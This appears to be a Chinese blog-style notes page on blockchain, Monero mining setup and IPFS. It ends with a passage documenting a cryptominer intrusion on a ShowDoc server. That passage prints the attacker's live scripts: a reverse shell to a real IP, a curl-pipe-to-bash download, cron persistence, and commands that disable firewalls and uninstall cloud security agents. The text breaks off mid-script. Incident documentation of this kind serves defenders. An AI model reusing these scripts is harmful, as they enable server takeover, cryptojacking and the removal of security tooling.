title="相关开源项目"></a>相关开源项目</h2><ul><li><a href="https://gitee.com/explore/blockchain" target="_blank" rel="noopener">gitee区块链开源项目</a></li><li><a href="https://gitee.com/jonluo/blockchain" target="_blank" rel="noopener">blockchain</a><ul><li>区块链技术学习程序样例</li></ul></li><li><a href="https://gitee.com/tianyalei/md_blockchain" target="_blank" rel="noopener">md_blockchain</a><ul><li>Java区块链平台，基于Springboot开发的区块链平台</li><li>该项目属于”链”，非”币”，不涉及虚拟币和挖矿</li></ul></li><li><a href="https://cn.hyperledger.org/" target="_blank" rel="noopener">hyperledger</a> <a href="https://www.infoq.cn/article/2018/09/how-choose-blockchain-framework" target="_blank" rel="noopener">^3</a><ul><li>Hyperledger Burrow：（之前称为 eris-db）是一种智能合约机，其中有一部分是根据以太坊虚拟机（EVM）规范构建的。</li><li><a href="https://github.com/hyperledger/fabric" target="_blank" rel="noopener">Hyperledger Fabric</a>：也叫超级账本。是区块链技术的一种实现，旨在作为开发区块链应用程序或解决方案的基础。开发环境建立在VirtualBox虚拟机上，部署环境可以自建网络，也可以直接部署在BlueMix上，部署方式可 传统可docker化，共识达成算法插件化，支持用Go和Java开发智能合约，尤以企业级的安全机制和membership机制为特色。Fabric之于区块链，很可能正如Hadoop之于大数据</li><li>Hyperledger Iroha：是一个分布式分类帐项目，旨在简化并易于整合到需要分布式分类帐技术的基础设施项目中。</li><li>Hyperledger Sawtooth：是一种模块化区块链套件，旨在实现多功能性和可扩展性</li></ul></li><li><a href="https://www.ethereum.org/" target="_blank" rel="noopener">以太坊</a><ul><li>公有链，任何人都可以加入以太坊网络，并且交易是透明的，欢迎公开审计</li><li>做共享账本的，有代币和挖矿等模块</li><li><a href="https://123eth.org/" target="_blank" rel="noopener">以太坊中文导航</a></li></ul></li><li><a href="https://github.com/web3j/web3j" target="_blank" rel="noopener">Web3j</a><ul><li>Web3j是一个用于连接以太坊节点的客户端开发库（Corda和Pantheon 则都是完整的区块链节点实现）</li></ul></li><li><a href="https://github.com/corda/corda" target="_blank" rel="noopener">Corda</a><ul><li>包含了业务流程、消息以及其他企业应用中的熟悉的概念</li></ul></li><li>Bletchley<ul><li>微软开源区块链平台项目</li></ul></li><li><a href="https://github.com/bitcoinj/bitcoinj" target="_blank" rel="noopener">Bitcoinj</a><ul><li>Bitcoinj是最流行的比特币协议的Java实现</li></ul></li></ul><h2 id="区块链架构"><a href="#区块链架构" class="headerlink" title="区块链架构"></a>区块链架构</h2><p><img src="/data/images/arch/blockchain-arch.png" alt="blockchain-arch.png"></p><ul><li>主流的区块链技术架构主要分为五层 <a href="https://www.codenong.com/cs106604338/" title="基于java开发一套完整的区块链系统详细教程" target="_blank" rel="noopener">^4</a><ul><li>数据层：是最底层的技术，主要实现了数据存储、账户信息、交易信息等模块，数据存储主要基于Merkle树，通过区块的方式和链式结构实现，而账户和交易基于数字签名、哈希函数和非对称加密技术等多种密码学算法和技术，来保证区块链中数据的安全性</li><li>网络层：主要实现网络节点的连接和通讯，又称点对点技术，各个区块链节点通过网络进行通信</li><li>共识层：是通过共识算法，让网络中的各个节点对全网所有的区块数据真实性正确性达成一致，防止出现拜占庭攻击、51攻击等区块链共识算法攻击</li><li>激励层：主要是实现区块链代币的发行和分配机制，是公有链的范畴</li><li>应用层：一般把区块链系统作为一个平台，在平台之上实现一些去中心化的应用程序或者智能合约，平台提供运行这些应用的虚拟机</li></ul></li></ul><h2 id="虚拟货币"><a href="#虚拟货币" class="headerlink" title="虚拟货币"></a>虚拟货币</h2><h3 id="门罗币-XMR"><a href="#门罗币-XMR" class="headerlink" title="门罗币(XMR)"></a>门罗币(XMR)</h3><ul><li><a href="https://web.getmonero.org/zh-cn/" target="_blank" rel="noopener">官网</a>、<a href="https://wallet.mymonero.com" target="_blank" rel="noopener">Web端钱包</a></li><li><a href="https://mp.weixin.qq.com/s/yxuO51VanFnVfRTCOJFvBA" target="_blank" rel="noopener">申请门罗钱包</a></li><li>挖矿收益计算: <a href="https://www.babaofan.com/miner/" target="_blank" rel="noopener">https://www.babaofan.com/miner/</a></li><li>矿池<ul><li><a href="https://minexmr.com/" target="_blank" rel="noopener">https://minexmr.com/</a> 最小提现0.004XMR</li><li><a href="https://www.minergate.com/" target="_blank" rel="noopener">https://www.minergate.com/</a> 最小提现0.005XMR</li><li><a href="https://www.supportxmr.com/、https://www.xmrpool.me/" target="_blank" rel="noopener">https://www.supportxmr.com/、https://www.xmrpool.me/</a> 最小提现0.1XMR</li></ul></li><li><p>门罗币挖矿程序</p><ul><li><a href="https://www.xmr-zh.com/tech/mining-tech.html" target="_blank" rel="noopener">挖矿教程</a></li><li><a href="https://github.com/fireice-uk/xmr-stak" target="_blank" rel="noopener">xmr-stak</a></li><li><p><a href="https://github.com/xmrig/xmrig" target="_blank" rel="noopener">xmrig</a> 支持Windows/Linux/MacOS，<a href="https://xmrig.com/docs/miner" target="_blank" rel="noopener">官方文档</a></p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># xmrig</span></span><br><span class="line">wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz</span><br><span class="line">tar -zxvf xmrig-6.12.1-linux-x64.tar.gz &amp;&amp; <span class="built_in">cd</span> xmrig-6.12.1</span><br><span class="line"><span class="comment"># 修改</span></span><br><span class="line">    <span class="comment"># pools.url="sg.minexmr.com:4444"(矿池, windows也可直接使用sg.minexmr.com)</span></span><br><span class="line">    <span class="comment"># pools.user="25dGDsxxxx"(钱包地址)</span></span><br><span class="line">    <span class="comment"># pools.rig-id="w001"(机器名, 任意)；有的是修改pools.pass来显示机器名，还有点是设置`pools.user=钱包地址.机器名`</span></span><br><span class="line">    <span class="comment"># donate-level=1(捐献比，最小1%)</span></span><br><span class="line"><span class="comment"># 可适当修改</span></span><br><span class="line">    <span class="comment"># cpu.max-threads-hint=80(暂用CPU比例)</span></span><br><span class="line">    <span class="comment"># "rx": [0, 1, 2] 表示启动 3 个 CPU 核心</span></span><br><span class="line"><span class="comment"># 运行中</span></span><br><span class="line">    <span class="comment"># hupa pages=100% 表示开启了大内存优化(否则建议优化, linux下管理员启动即可). https://xmrig.com/docs/miner/hugepages</span></span><br><span class="line">vi config.json <span class="comment"># 修改配置后，无需重启</span></span><br><span class="line">sudo ./xmrig <span class="comment"># 可使用screen命令后台运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># docker 部署</span></span><br><span class="line">docker run --restart=always --network host -d -v /etc/xmrig/config.json:/etc/xmrig/config.json -e CPU_USAGE=80 --name xmr snowdream/xmr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看是否有GPU</span></span><br><span class="line">lspci | grep -i vga <span class="comment"># 查看是否有AMD</span></span><br><span class="line">lspci | grep -i nvidia <span class="comment"># 查看是否有N卡</span></span><br></pre></td></tr></table></figure></li><li><p>Centos下CPU加入MinerGate矿池教程 <a href="https://www.bobobk.com/973.html" target="_blank" rel="noopener">https://www.bobobk.com/973.html</a></p><ul><li>centos7上编译CPUMiner-Multi并在minergate矿池中挖矿，不过由于是cpu，效率较低，1核的速度只有大约20 H/s的速度</li></ul></li></ul></li></ul><h2 id="Web3-0"><a href="#Web3-0" class="headerlink" title="Web3.0"></a>Web3.0</h2><p><img src="/data/images/arch/web3.0-web2.0.png" alt="web3.0与web2.0应用对比"></p><h3 id="分布式文件存储IPFS"><a href="#分布式文件存储IPFS" class="headerlink" title="分布式文件存储IPFS"></a>分布式文件存储IPFS</h3><ul><li><a href="https://ipfs.tech" target="_blank" rel="noopener">https://ipfs.tech</a></li><li><p><a href="https://blog.csdn.net/inthat/article/details/106206591" target="_blank" rel="noopener">https://blog.csdn.net/inthat/article/details/106206591</a></p></li><li><p>IPFS属于Web3.0的应用范畴，相当于Web2.0中的dropbox</p></li><li>IPFS是一个点对点的分布式文件系统（比特币是一种点对点的电子现金系统），目标是为了补充（甚至是取代）目前统治互联网的超文本传输协议（HTTP），将所有具有相同文件系统的计算设备连接在一起。原理用基于内容的地址替代基于域名的地址，也就是用户寻找的不是某个地址而是储存在某个地方的内容，不需要验证发送者的身份，而只需要验证内容的哈希，通过这样可以让网页的速度更快、更安全、更健壮、更持久</li><li>互联网是建立在HTTP协议上的，HTTP协议的中心化造成效率非常低，并且成本还很高<ul><li>一旦使用HTTP协议每次需要从中心化的服务器下载完整的文件(网页,视频,图片等),速度慢,效率低。如果改用P2P的方式下载,可以节省近60%的带宽. P2P将文件分割为小的块,从多个服务器同时下载,速度非常快.</li><li>还有一种就是web文件经常被删除。我们可能在上网的过程中会遇到，收藏某个网页，在使用的时候浏览器网页会显示404。IPFS提供了文件的历史版本回溯功能(就像git版本控制工具一样),可以很容易的查看文件的历史版本,数据可以得到永久保存</li></ul></li></ul><h2 id="挖坑程序入侵案例"><a href="#挖坑程序入侵案例" class="headerlink" title="挖坑程序入侵案例"></a>挖坑程序入侵案例</h2><h3 id="基于apache-php-linux环境的ShowDoc应用"><a href="#基于apache-php-linux环境的ShowDoc应用" class="headerlink" title="基于apache-php-linux环境的ShowDoc应用"></a>基于apache-php-linux环境的ShowDoc应用</h3><ul><li>服务器症状<ul><li>发现服务器CPU和内存占用较高</li><li>且出现很多apache用户进程，如<code>apache   19483     1 13 May08 ?        02:32:29 /tmp/.inis</code>和<code>apache   19483     1 13 May08 ?        02:32:29 /tmp/.libs</code>等</li><li>ShowDoc应用文件上传目录，存在一些<code>.php</code>的脚本文件，且存在<code>xmrig</code>的执行程序</li></ul></li><li>查看<code>/tmp/.inis</code>发现如下</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> [ -w /usr/sbin ]; <span class="keyword">then</span></span><br><span class="line">  SPATH=/usr/sbin</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  SPATH=/tmp</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">MD5_1_XMR=<span class="string">"e5c3720e14a5ea7f678e0a9835d28283"</span></span><br><span class="line">MD5_2_XMR=`md5sum <span class="variable">$SPATH</span>/.libs | awk <span class="string">'&#123;print $1&#125;'</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$MD5_1_XMR</span>"</span> = <span class="string">"<span class="variable">$MD5_2_XMR</span>"</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [ $(netstat -ant|grep <span class="string">'107.172.214.23:80'</span>|grep <span class="string">'ESTABLISHED'</span>|grep -v grep|wc -l) -eq <span class="string">'0'</span> ]</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">    <span class="variable">$SPATH</span>/.libs</span><br><span class="line">  <span class="keyword">elif</span> [ $(netstat -ant|grep <span class="string">'198.46.202.146:8899'</span>|grep <span class="string">'ESTABLISHED'</span>|grep -v grep|wc -l) -eq <span class="string">'0'</span> ]</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">    bash -i &gt;&amp; /dev/tcp/198.46.202.146/8899 0&gt;&amp;1</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"ok"</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  (curl -s http://w.apacheorg.top:1234/xmss||wget -q -O - http://w.apacheorg.top:1234/xmss)|bash -sh</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">sleep 30m</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><ul><li><p>且查看定时任务列表</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo crontab -u apache -l</span></span><br><span class="line">30 23 * * * (curl -s http://w.apacheorg.top:1234/xmss||wget -q -O - http://w.apacheorg.top:1234/xmss )|bash -sh</span><br></pre></td></tr></table></figure></li><li><p>上述脚本会从<code>http://w.apacheorg.top:1234/xmss</code>下载一个脚本</p></li></ul><p><details></details></p><summary>脚本内容</summary><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">setenforce 0 2&gt;/dev/null</span><br><span class="line"><span class="built_in">ulimit</span> -n 65535</span><br><span class="line">ufw <span class="built_in">disable</span></span><br><span class="line">iptables -F</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"vm.nr_hugepages=<span class="variable">$((1168+$(nproc)</span>))"</span> | tee -a /etc/sysctl.conf</span><br><span class="line">sysctl -w vm.nr_hugepages=$((1168+$(nproc)))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'0'</span> &gt;/proc/sys/kernel/nmi_watchdog</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'kernel.nmi_watchdog=0'</span> &gt;&gt;/etc/sysctl.conf</span><br><span class="line">netstat -antp | grep <span class="string">':3333'</span>  | awk <span class="string">'&#123;print $7&#125;'</span> | sed -e <span class="string">"s/\/.*//g"</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep <span class="string">':4444'</span>  | awk <span class="string">'&#123;print $7&#125;'</span> | sed -e <span class="string">"s/\/.*//g"</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep <span class="string">':5555'</span>  | awk <span class="string">'&#123;print $7&#125;'</span> | sed -e <span class="string">"s/\/.*//g"</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep <span class="string">':7777'</span>  | awk <span class="string">'&#123;print $7&#125;'</span> | sed -e <span class="string">"s/\/.*//g"</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep <span class="string">':14444'</span>  | awk <span class="string">'&#123;print $7&#125;'</span> | sed -e <span class="string">"s/\/.*//g"</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep <span class="string">':5790'</span>  | awk <span class="string">'&#123;print $7&#125;'</span> | sed -e <span class="string">"s/\/.*//g"</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep <span class="string">':45700'</span>  | awk <span class="string">'&#123;print $7&#125;'</span> | sed -e <span class="string">"s/\/.*//g"</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep <span class="string">':2222'</span>  | awk <span class="string">'&#123;print $7&#125;'</span> | sed -e <span class="string">"s/\/.*//g"</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep <span class="string">':9999'</span>  | awk <span class="string">'&#123;print $7&#125;'</span> | sed -e <span class="string">"s/\/.*//g"</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep <span class="string">':20580'</span>  | awk <span class="string">'&#123;print $7&#125;'</span> | sed -e <span class="string">"s/\/.*//g"</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep <span class="string">':13531'</span>  | awk <span class="string">'&#123;print $7&#125;'</span> | sed -e <span class="string">"s/\/.*//g"</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep <span class="string">'23.94.24.12'</span>  | awk <span class="string">'&#123;print $7&#125;'</span> | sed -e <span class="string">'s/\/.*//g'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep <span class="string">'134.122.17.13'</span>  | awk <span class="string">'&#123;print $7&#125;'</span> | sed -e <span class="string">'s/\/.*//g'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep <span class="string">'66.70.218.40'</span>  | awk <span class="string">'&#123;print $7&#125;'</span> | sed -e <span class="string">'s/\/.*//g'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep <span class="string">'209.141.35.17'</span>  | awk <span class="string">'&#123;print $7&#125;'</span> | sed -e <span class="string">'s/\/.*//g'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"123"</span></span><br><span class="line">netstat -antp | grep <span class="string">'119.28.4.91'</span>  | awk <span class="string">'&#123;print $7&#125;'</span> | sed -e <span class="string">'s/\/.*//g'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep <span class="string">'101.32.73.178'</span>  | awk <span class="string">'&#123;print $7&#125;'</span> | sed -e <span class="string">'s/\/.*//g'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep 185.238.250.137 | awk <span class="string">'&#123;print $7&#125;'</span> | awk -F <span class="string">'[/]'</span> <span class="string">'&#123;print $1&#125;'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep tmate | awk <span class="string">'&#123;print $7&#125;'</span> | awk -F <span class="string">'[/]'</span> <span class="string">'&#123;print $1&#125;'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep kinsing | awk <span class="string">'&#123;print $7&#125;'</span> | awk -F <span class="string">'[/]'</span> <span class="string">'&#123;print $1&#125;'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep kdevtmpfsi | awk <span class="string">'&#123;print $7&#125;'</span> | awk  -F <span class="string">'[/]'</span> <span class="string">'&#123;print $1&#125;'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep pythonww | awk <span class="string">'&#123;print $7&#125;'</span> | awk -F <span class="string">'[/]'</span> <span class="string">'&#123;print $1&#125;'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep tcpp | awk <span class="string">'&#123;print $7&#125;'</span> | awk -F <span class="string">'[/]'</span> <span class="string">'&#123;print $1&#125;'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep c3pool | awk <span class="string">'&#123;print $7&#125;'</span> | awk -F <span class="string">'[/]'</span> <span class="string">'&#123;print $1&#125;'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep xmr | awk <span class="string">'&#123;print $7&#125;'</span> | awk -F <span class="string">'[/]'</span> <span class="string">'&#123;print $1&#125;'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep f2pool | awk <span class="string">'&#123;print $7&#125;'</span> | awk -F <span class="string">'[/]'</span> <span class="string">'&#123;print $1&#125;'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep crypto-pool | awk <span class="string">'&#123;print $7&#125;'</span> | awk -F <span class="string">'[/]'</span> <span class="string">'&#123;print $1&#125;'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep t00ls | awk <span class="string">'&#123;print $7&#125;'</span> | awk -F <span class="string">'[/]'</span> <span class="string">'&#123;print $1&#125;'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep vihansoft | awk <span class="string">'&#123;print $7&#125;'</span> | awk -F <span class="string">'[/]'</span> <span class="string">'&#123;print $1&#125;'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -antp | grep mrbpool | awk <span class="string">'&#123;print $7&#125;'</span> | awk -F <span class="string">'[/]'</span> <span class="string">'&#123;print $1&#125;'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps -fe | grep <span class="string">'/usr/sbin/sshd'</span> | grep <span class="string">'sshgood'</span> | grep -v grep  | awk <span class="string">'&#123;print $2&#125;'</span> | sed -e <span class="string">'s/\/.*//g'</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -a -E <span class="string">"kdevtmpfsi|kinsing|solr|f2pool|tcpp|xmr|tmate|185.238.250.137|c3pool"</span> | awk <span class="string">'&#123;print $2&#125;'</span> | xargs <span class="built_in">kill</span> -9</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">der</span></span>()&#123;</span><br><span class="line">  <span class="keyword">if</span> ps aux | grep -i <span class="string">'[a]liyun'</span>; <span class="keyword">then</span></span><br><span class="line">    (wget -q -O - http://update.aegis.aliyun.com/download/uninstall.sh||curl -s http://update.aegis.aliyun.com/download/uninstall.sh)|bash; lwp-download http://update.aegis.aliyun.com/download/uninstall.sh /tmp/uninstall.sh; bash /tmp/uninstall.sh</span><br><span class="line">    (wget -q -O - http://update.aegis.aliyun.com/download/quartz_uninstall.sh||curl -s http://update.aegis.aliyun.com/download/quartz_uninstall.sh)|bash; lwp-download http://update.aegis.aliyun.com/download/quartz_uninstall.sh /tmp/uninstall.sh; bash /tmp/uninstall.sh</span><br><span class="line">    pkill aliyun-service</span><br><span class="line">    rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service</span><br><span class="line">    rm -rf /usr/<span class="built_in">local</span>/aegis*</span><br><span class="line">    systemctl stop aliyun.service</span><br><span class="line">    systemctl <span class="built_in">disable</span> aliyun.service</span><br><span class="line">    service bcm-agent stop</span><br><span class="line">    yum remove bcm-agent -y</span><br><span class="line">    apt-get remove bcm-agent -y</span><br><span class="line">    /usr/<span class="built_in">local</span>/cloudmonitor/wrapper/bin/cloudmonitor.sh stop</span><br><span class="line">    /usr/<span class="built_in">local</span>/cloudmonitor/wrapper/bin/cloudmonitor.sh remove</span><br><span class="line">    rm -rf /usr/<span class="built_in">local</span>/cloudmonitor</span><br><span class="line">  <span class="keyword">elif</span> ps aux | grep -i <span class="string">'[y]unjing'</span>; <span class="keyword">then</span></span><br><span class="line">    /usr/<span class="built_in">local</span>/qcloud/stargate/admin/uninstall.sh</span><br><span class="line">    /usr/<span class="built_in">local</span>/qcloud/YunJing/uninst.sh</span><br><span class="line">    /usr/<span class="built_in">local</span>/qcloud/monitor/barad/admin/uninstall.sh</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  sleep 1</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"DER Uninstalled"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">der</span><br><span class="line"><span 